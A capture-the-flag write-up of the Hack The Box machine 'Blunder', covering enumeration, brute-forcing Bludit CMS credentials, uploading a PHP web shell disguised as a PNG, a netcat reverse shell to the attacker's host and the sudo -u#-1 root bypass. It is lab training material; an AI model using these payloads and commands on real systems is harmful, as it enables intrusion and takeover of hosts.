---
title: "[HTB] Machine: Blunder"
description: "[HTB] Machine: Blunder"
date: 2023-07-01
menu:
  sidebar:
    name: "[HTB] Machine: Blunder"
    identifier: htb-machine-blunder
    parent: htb-machines-linux
    weight: 10
hero: images/blunder.png
tags: ["HTB"]
---

# Blunder
## Enumeration
- `nmap`
```
└─$ nmap -sC -sV -Pn 10.10.10.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:05 BST
Nmap scan report for 10.10.10.191 (10.10.10.191)
Host is up (0.10s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.64 seconds
```
- Web server

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.191
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2023/07/01 14:00:27 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/about                (Status: 200) [Size: 3281]
/.php                 (Status: 403) [Size: 277]
/0                    (Status: 200) [Size: 7562]
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/install.php          (Status: 200) [Size: 30]
/robots.txt           (Status: 200) [Size: 22]
/todo.txt             (Status: 200) [Size: 118]
/usb                  (Status: 200) [Size: 3960]
/LICENSE              (Status: 200) [Size: 1083]
```

- Interesting paths

![](./images/2.png)
![](./images/3.png)

## Foothold
- `Searchsploit`

![](./images/4.png)

- We know from the note that there is a user named `fergus`
  - Need to find version of the cms
  - We can assume it's version is `3.9.2`

![](./images/5.png)
![](./images/7.png)

- Let's check an exploit for credential bruteforcing

![](./images/6.png)

- So I ran `poc` with `rockyou` wordlist, but no success
  - Then I used `cewl` to create a wordlist from the webserver
  - `cewl http://10.10.10.191 > passwd.list`

![](./images/8.png)

- Then I started the exploit
  - `fergus:RolandDeschain`

![](./images/9.png)
![](./images/10.png)

- It seems that `Bludit` also has directory traversal vulnerability

![](./images/11.png)

- Let's run that exploit
  - Prepare payloads
    - `echo '<?php system($_REQUEST["cmd"]); ?>' > evil.png`
    - `echo "RewriteEngine off" > .htaccess`
    - `echo "AddType application/x-httpd-php .png" >> .htaccess`

![](./images/12.png)
![](./images/13.png)
![](./images/14.png)

- Rev shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.7 6666 >/tmp/f`
  - URL encoded:`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.7%206666%20%3E%2Ftmp%2Ff`

![](./images/15.png)
![](./images/16.png)
## User
- Enumeration
  - We can start with `linpeas`
  - Or
    - Start with `/var/www`
    - Let's search for files with `password` 
  - We found 2 `users.php` files for `3.10.0a` and `3.9.2` versions
    - We see a password for `Hugo`, which is a user on the box

![](./images/17.png)
![](./images/18.png)
![](./images/19.png)

- Crack the hash and try `su`
  - `hugo:Password120`

![](./images/20.png)
![](./images/21.png)

## Root
- Start with `sudo -l`

![](./images/22.png)

- We can run `sudo` as any user except `root`
  - Let's check the version just in case

![](./images/23.png)

- We have a [bypass](https://www.exploit-db.com/exploits/47502) for this specific case
  - `sudo -u#-1 /bin/bash`

![](./images/24.png)
![](./images/25.png)
